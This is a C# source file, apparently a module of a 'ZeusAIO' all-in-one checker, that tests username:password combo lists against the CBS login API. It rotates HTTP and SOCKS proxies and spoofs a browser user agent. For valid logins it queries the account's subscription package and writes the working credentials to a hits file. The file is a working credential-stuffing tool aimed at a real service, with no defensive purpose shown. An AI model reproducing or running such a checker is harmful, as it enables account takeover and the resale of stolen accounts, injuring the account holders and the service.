using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Cbs
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string str = "_remember_me=NO&j_password=" + s[1] + "&j_username=" + s[0] + "&locale=en-US";
                            string strResponse = httpRequest.Post("https://www.cbs.com/apps-api/v2.0/iphone/auth/login.json?at=ABA5MzQ4MjEwNTE3ODQwMzU4XOOw7eWFZmOmb7ZHnqXocg2UTDahpBnxY5dyeSHgiWDwXXh9XsWhT/yFwEausu4o", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("Invalid username/password pair\",\"success"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("userId")) //hit
                                {
                                    string cap = httpRequest.Get("https://www.cbs.com/apps-api/v3.0/iphone/login/status.json?at=ABA5MzQ4MjEwNTE3ODQwMzU4XOOw7eWFZmOmb7ZHnqXocg2UTDahpBnxY5dyeSHgiWDwXXh9XsWhT/yFwEausu4o&locale=en-US", null).ToString();
                                    string sub = Regex.Match(cap, "packageCode\":(.*?),").Groups[1].Value;
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui== "2")
                                    {
                                        Console.WriteLine("[HIT - CBS] " + s[0] + ":" + s[1] + " | Sub: " + sub, Color.Green);
                                    }
                                    Export.AsResult("/Cbs_hits", s[0] + ":" + s[1] + " | Sub: " + sub);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
